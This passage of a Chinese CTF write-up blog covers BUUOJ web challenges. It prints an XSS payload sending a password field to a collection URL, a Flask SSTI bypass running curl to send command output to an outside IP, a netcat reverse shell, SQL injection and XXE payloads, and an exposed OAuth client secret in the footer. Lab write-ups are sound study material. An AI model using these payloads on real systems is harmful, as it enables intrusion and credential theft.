class="string">&quot;password&quot;</span>)[<span class="number">0</span>].value;</span><br><span class="line">	docucookiement.locacookietion=<span class="string">&quot;http://xss.buuoj.cn/index.php?do=api&quot;</span>+a+<span class="string">&quot;id=eNmsmO&quot;</span>+a+<span class="string">&quot;location=&quot;</span>+psw;</span><br><span class="line">&lt;/scrcookieipt&gt;</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;incookieput type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;</span><br><span class="line">&lt;incookieput type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">&lt;scrcookieipt scookierc=<span class="string">&quot;./js/login.js&quot;</span>&gt;&lt;/scrcookieipt&gt;</span><br><span class="line">&lt;scrcookieipt&gt;</span><br><span class="line">    <span class="keyword">var</span> psw = docucookiement.getcookieElementsByName(<span class="string">&quot;password&quot;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    docucookiement.locacookietion=<span class="string">&quot;http://http.requestbin.buuoj.cn/1i4cmve1/?a=&quot;</span>+psw;</span><br><span class="line">&lt;/scrcookieipt&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨äº†æŠŠå…³é”®å­—æ›¿æ¢ä¸ºç©ºçš„ä»£ç é€»è¾‘, æ‹¼æ¥å³å¯ç»•è¿‡.(å­¦ä¹ äº†!!!! ä»¥åå®¡CMSå¤šæ³¨æ„ä¸€ä¸‹!)</p>
<p>æˆ‘ç”¨XSS å¹³å°æ‰“ä¸é€š, æ”¶ä¸åˆ°æ•°æ®, ç”¨ç¬¬äºŒä¸ªå¯ä»¥, åƒäº†åˆé¥­å­¦ä¸€å­¦ å…³äºCSPçš„å®‰å…¨é—®é¢˜å§ ğŸŒˆ</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/94246164">https://zhuanlan.zhihu.com/p/94246164</a></li>
<li><a target="_blank" rel="noopener" href="https://evoa.me/index.php/archives/53/">https://evoa.me/index.php/archives/53/</a></li>
</ul>
<p>CSP çš„å®è´¨å°±æ˜¯ç™½åå•æœºåˆ¶ï¼Œå¯¹ç½‘ç«™åŠ è½½æˆ–æ‰§è¡Œçš„èµ„æºè¿›è¡Œå®‰å…¨ç­–ç•¥çš„æ§åˆ¶ã€‚</p>
<blockquote>
<p>CSP æŒ‡çš„æ˜¯å†…å®¹å®‰å…¨ç­–ç•¥ï¼Œä¸ºäº†ç¼“è§£å¾ˆå¤§ä¸€éƒ¨åˆ†æ½œåœ¨çš„è·¨ç«™è„šæœ¬é—®é¢˜ï¼Œæµè§ˆå™¨çš„æ‰©å±•ç¨‹åºç³»ç»Ÿå¼•å…¥äº†å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰çš„ä¸€èˆ¬æ¦‚å¿µã€‚è¿™å°†å¼•å…¥ä¸€äº›ç›¸å½“ä¸¥æ ¼çš„ç­–ç•¥ï¼Œä¼šä½¿æ‰©å±•ç¨‹åºåœ¨é»˜è®¤æƒ…å†µä¸‹æ›´åŠ å®‰å…¨ï¼Œå¼€å‘è€…å¯ä»¥åˆ›å»ºå¹¶å¼ºåˆ¶åº”ç”¨ä¸€äº›è§„åˆ™ï¼Œç®¡ç†ç½‘ç«™å…è®¸åŠ è½½çš„å†…å®¹ã€‚</p>
</blockquote>
<p>ç®€è€Œè¨€ä¹‹å°±æ˜¯ä¸ªé—¨ç¦ï¼Œåˆ·å¡æ‰èƒ½è¿›ã€‚</p>
<h1 id="GWCTF-2019-ä½ çš„åå­—"><a href="#GWCTF-2019-ä½ çš„åå­—" class="headerlink" title="[GWCTF 2019]ä½ çš„åå­—"></a>[GWCTF 2019]ä½ çš„åå­—</h1><ul>
<li><p>flask ssti è¿‡æ»¤äº† </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>é»‘åå•é€»è¾‘æ¼æ´</p>
</li>
<li><p>Linux æ–‡ä»¶æ“ä½œçŸ¥è¯†</p>
</li>
</ul>
<p>ç¬¬ä¸€çœ¼çœ‹æŠŠè¾“å…¥è¾“å‡ºå†å±å¹•ä¸Š å°±æƒ³åˆ°äº†SSTI , åé¢æŠ¥é”™æ˜¯phpçš„â€¦ ç„¶åæˆ‘å°±æ‡µäº†, çœ‹WP, å‘ç°æ˜¯è¿‡æ»¤äº†</p>
<p><a target="_blank" rel="noopener" href="https://github.com/gwht/2019GWCTF/tree/master/wp/web/%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97">https://github.com/gwht/2019GWCTF/tree/master/wp/web/%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97</a></p>
<p>åœ¨Github ä¸Šæ‰¾åˆ°æºç . è¿™é¢˜æ²¡æºç èƒ½åšå‡ºæ¥çš„éƒ½æ˜¯å¤§ä½¬, fuzz èƒ½åŠ›ä¸çŸ¥é“æœ‰å¤šå¼º</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/index.php&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_filter</span>(<span class="params">s</span>):</span></span><br><span class="line">        blacklist1 = [<span class="string">&#x27;&#123;import&#x27;</span>,<span class="string">&#x27;&#123;getattr&#x27;</span>,<span class="string">&#x27;&#123;os&#x27;</span>,<span class="string">&#x27;&#123;class&#x27;</span>,<span class="string">&#x27;&#123;subclasses&#x27;</span>,<span class="string">&#x27;&#123;mro&#x27;</span>,<span class="string">&#x27;&#123;request&#x27;</span>,<span class="string">&#x27;&#123;args&#x27;</span>,<span class="string">&#x27;&#123;eval&#x27;</span>,<span class="string">&#x27;&#123;if&#x27;</span>,<span class="string">&#x27;&#123;for&#x27;</span>,<span class="string">&#x27;&#123;subprocess&#x27;</span>,<span class="string">&#x27;&#123;file&#x27;</span>,<span class="string">&#x27;&#123;open&#x27;</span>,<span class="string">&#x27;&#123;popen&#x27;</span>,<span class="string">&#x27;&#123;builtins&#x27;</span>,<span class="string">&#x27;&#123;compile&#x27;</span>,<span class="string">&#x27;&#123;execfile&#x27;</span>,<span class="string">&#x27;&#123;from_pyfile&#x27;</span>,<span class="string">&#x27;&#123;local&#x27;</span>,<span class="string">&#x27;&#123;self&#x27;</span>,<span class="string">&#x27;&#123;item&#x27;</span>,<span class="string">&#x27;&#123;getitem&#x27;</span>,<span class="string">&#x27;&#123;getattribute&#x27;</span>,<span class="string">&#x27;&#123;func_globals&#x27;</span>,<span class="string">&#x27;&#123;config&#x27;</span>]</span><br><span class="line">        blacklist_strong = blacklist1 + [<span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>] <span class="comment"># å¼ºåˆ¶è¿‡æ»¤æ‰äº† &#123;&#123;  å’Œ &#125;&#125;</span></span><br><span class="line">        <span class="keyword">for</span> no <span class="keyword">in</span> blacklist_strong:</span><br><span class="line">            <span class="keyword">if</span> no <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;for&#x27;</span>,<span class="string">&#x27; subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;config&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">if</span> no <span class="keyword">in</span> s:</span><br><span class="line">                    s =s.replace(no,<span class="string">&#x27;&#x27;</span>) <span class="comment"># å°†ä¸Šé¢çš„å…³é”®å­—æ›¿æ¢ä¸ºç©º</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = request.form[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        template = <span class="string">&#x27;hello &#123;&#125;!&#x27;</span>.format(name) <span class="comment"># æä¾›äº†&#123;&#125;</span></span><br><span class="line">        name1 = render_template_string(safe_filter(template)) <span class="comment"># æ¸²æŸ“</span></span><br><span class="line">        <span class="keyword">print</span> name1</span><br><span class="line">        <span class="keyword">if</span> name1 == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            template1 = <span class="string">u&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;strong&gt;Parse error:&lt;/strong&gt; syntax error, unexpected T_STRING, expecting &#x27;&#123;&#x27; in &lt;strong&gt;\\var\\WWW\\html\\test.php&lt;/strong&gt; on line &lt;strong&gt;13&lt;/strong&gt;</span></span><br><span class="line"><span class="string">                &#x27;&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> render_template_string(template1) <span class="comment"># è¿”å›phpçš„æŠ¥é”™</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, name=name1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å› ä¸º<code>config</code> æ”¾åœ¨æœ€åé¢, ç„¶åè¿™ä¸ªé»‘åå•æ˜¯é€šè¿‡å¾ªç¯æ¥å®ç°çš„, é‚£ä¹ˆåœ¨å¤„ç†ä¸Š,å¯èƒ½ä¼šæ»å,å¹¶ä¸”è¿™é‡ŒæŠŠconfigæ›¿æ¢ä¸ºç©º,é‚£ä¹ˆå¯ä»¥æŠŠæ’å…¥payloadå…³é”®å­—çš„ä¸­é—´,å³å¯ç»•è¿‡å…³é”®å­—è¿‡æ»¤äº†, åœ¨åšå®¢ä¸­æ‰¾ä¸€ä¸ªpayload</p>
<p><a href="https://hack-for.fun/posts/20200305/#Bypass-2">https://hack-for.fun/posts/20200305/#Bypass-2</a> , æŠŠconfig æ’è¿›å»å³å¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf &#39;&#39;.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecache.oconfigs.poconfigpen(&#39;curl 174.1.226.7:1234&#x2F;?i&#x3D;&#96;ls &#x2F;|grep flag&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 174.1.226.7 1234 -t -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>æœ¬æ¥æƒ³ç”¨ä¸Šé¢åå¼¹shell çš„ä½†æ˜¯æ²¡æœ‰æˆåŠŸ</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200407155424.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf &#39;&#39;.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecache.oconfigs.poconfigpen(&#39;curl 174.1.226.7:1234&#x2F;?i&#x3D;&#96;ls &#x2F;|grep flag&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>flag_1s_Hera </code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf &#39;&#39;.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecache.oconfigs.poconfigpen(&#39;curl 174.1.226.7:1234&#x2F;?i&#x3D;&#96;cat &#x2F;flag_1s_Hera&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flagâ€¦ æŒºå–œæ¬¢è¿™ä¸ªç±»å‹çš„é¢˜ç›®çš„ ğŸ˜„</p>
<h1 id="GWCTF-2019-blog"><a href="#GWCTF-2019-blog" class="headerlink" title="[GWCTF 2019]blog"></a>[GWCTF 2019]blog</h1><ul>
<li>æˆ‘çš„æ€è·¯: æ–‡ä»¶ä¸Šä¼ å›¾ç‰‡é©¬+ <code>.htaccess</code> + æ–‡ä»¶åŒ…å«è§£æå›¾ç‰‡é©¬ getshell</li>
<li>é‡åˆ°çš„é—®é¢˜: å› ä¸ºæ–‡ä»¶åŒ…å«å¿…é¡»è¦adminæ‰è¡Œ, è¿™é‡Œæ²¡åŠæ³•å®ç°adminèº«ä»½ä¼ªé€ </li>
<li>çœ‹äº†WP: æ–‡ä»¶åæ³¨å…¥(Orzâ€¦å‡ ä¹å¿«å¿˜äº†,ä¹‹å‰åš2018çº§å®éªŒç­çš„é¢˜æœ‰ä¸€ä¸ªé¢˜å°±æ˜¯æ–‡ä»¶åæ³¨å…¥), è¿™é‡ŒæŠŠæ–‡ä»¶åæ‰“å°åœ¨é¡µé¢äº†å¯èƒ½æ˜¯ç»è¿‡äº†æ•°æ®åº“æ“ä½œç„¶åè¾“å‡ºçš„</li>
<li>CBC ç¿»è½¬</li>
<li>äºŒæ¬¡æ¸²æŸ“</li>
</ul>
<p>fuzz ä¸€ä¸‹, ç„¶ååœ¨é¡µé¢çœ‹, å“ªäº›æ˜¯ç©ºæ ¼å°±è¯´æ˜å“ªäº›è¢«è¿‡æ»¤æ‰äº†, â€¦â€¦ Orz è¿™ä¸ªå’Œfuzz çš„é¡ºåºä¸ä¸€æ ·â€¦ æ‰‹åŠ¨fuzzæŠŠ</p>
<p>è¿‡æ»¤äº†æœ‰, </p>
<ul>
<li>select, åŒå†™å³å¯ç»•è¿‡<code>seleselectct</code> </li>
<li>ç©ºæ ¼, <code>&lt;&gt;</code> ç»•è¿‡,å‘ç°å¾ˆå¤šæƒ…å†µç”¨è¿™ä¸ªæ²¡æœ‰ç»“æœ, åˆ©ç”¨æ³¨é‡Š<code>/*123*/</code> </li>
</ul>
<p>ç›´æ¥<code>union/*123*/seleselectct/*123*/1,2,database()</code> è¯»ä¸åˆ°æ•°æ®</p>
<p>ç›´æ¥æ‹¿wpçš„payloadäº†, è¿™é‡Œè¿›è¡Œäº†è¿›åˆ¶è½¬æ¢, å¯èƒ½è¿™æ ·æ‰èƒ½è¯»åˆ°æ•°æ®æŠŠ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;+(selselectect(conv(substr(hex((selselectect(GROGROUPUP_CONCONCATCAT(password))frfromom(byte_user))),1,8),16,10)))+&#39;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè§£é‡Šå‡ ä¸ªå‡½æ•°</p>
<ul>
<li>Hex() å‡½æ•° ç›¸ç­‰äº =&gt; <code>CONV(N,10,16)</code> ,å³10è¿›åˆ¶è½¬ä¸º16è¿›åˆ¶, ç„¶åè¿™é‡Œåˆç”¨äº†conv(N,16,10), æœ€åå¾—åˆ°çš„å°±æ˜¯10è¿›åˆ¶æ•°</li>
<li>Substr()å‡½æ•° , ä»åˆ¶å®šå­—ç¬¦ä¸²çš„ç¬¬startä½ç½®å¼€å§‹, æˆªå–lengthé•¿åº¦çš„å­—ç¬¦ä¸²</li>
</ul>
<p>åè¿›åˆ¶çš„æ•°æ®</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="b01lers2020-Scrambled"><a href="#b01lers2020-Scrambled" class="headerlink" title="[b01lers2020]Scrambled"></a>[b01lers2020]Scrambled</h1><ul>
<li>cookie</li>
</ul>
<p>cookie æœ‰ä¸¤ä¸ªå‚æ•°, ç¬¬ä¸€ä¸ªå‚æ•°éšç€åˆ·æ–°æ¬¡æ•°å¢åŠ è€Œå¢åŠ , å¦ä¸€ä¸ªå‚æ•°, åªæœ‰ä¸­é—´ä¸€éƒ¨åˆ†éšæœºå˜åŒ–</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kxkxkxkxsh957kxkxkxkxsh</span><br><span class="line">kxkxkxkxshla1kxkxkxkxsh</span><br></pre></td></tr></table></figure>

<p>åˆ·æ–°ä¸¤æ¬¡å°±çŸ¥é“åªæœ‰ä¸­é—´ä¸‰ä½æ•°åœ¨å‘ç”Ÿéšæœºå˜åŒ–</p>
<p>wp å†™çš„ç”¨è„šæœ¬æ¥è·‘,  ä»¥ååœ¨æ¥åšå¥½äº†</p>
<h1 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h1><ul>
<li>XXE SSRF ç»„åˆæ‹³</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/hosts&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ¢æµ‹å†…ç½‘ä¸»æœº</p>
<p>å¾—åˆ°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">::1	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0	ip6-localnet</span><br><span class="line">ff00::0	ip6-mcastprefix</span><br><span class="line">ff02::1	ip6-allnodes</span><br><span class="line">ff02::2	ip6-allrouters</span><br><span class="line">173.122.231.9	osrc</span><br></pre></td></tr></table></figure>

<p>è®¿é—®å†…ç½‘ä¸»æœº</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line"> &lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;173.122.231.9&quot;&gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>

<p> æ²¡æœ‰ç»“æœ,  æ”¹ä¸º 10å°±å¯ä»¥äº†</p>
<h1 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h1><ul>
<li><strong>è´­ä¹°ç±»çš„é¢˜å¾ˆæœ‰å¯èƒ½æ˜¯é€»è¾‘æ¼æ´æˆ–è€…æº¢å‡º</strong> </li>
<li><strong>Flask session è§£å¯†</strong></li>
<li><strong>#</strong> æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´(ä¸ªäººçš„å–œæ¬¢å«æ³•), æ³¨é‡Šä½œç”¨, å¯¼è‡´ä»£ç é€»è¾‘è¢«æ”¹å˜</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/92170270">https://blog.csdn.net/zz_Caleb/article/details/92170270</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200409174736.png"></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/f81b.html">https://hack-for.fun/f81b.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><div class="social-share pull-right" data-disabled="google,facebook"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/e280.html"><i class="fa fa-chevron-left">  </i><span>ä¸€æ–‡å°æ€»ç»“é€»è¾‘æ¼æ´</span></a></div><div class="next-post pull-right"><a href="/21e1.html"><span>ä¸€æ–‡å°æ€»ç»“ä¸­é—´ä»¶æ¼æ´</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: '6ceed9c245da8d33222a',
  clientSecret: '143c0add0301972b963c8f672bf4e58a092673fb',
  repo: 'Gitalk',
  owner: 'ifonly-go2019',
  admin: 'ifonly-go2019',
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN'
})
gitalk.render('gitalk-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2021 By m0nk3y</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>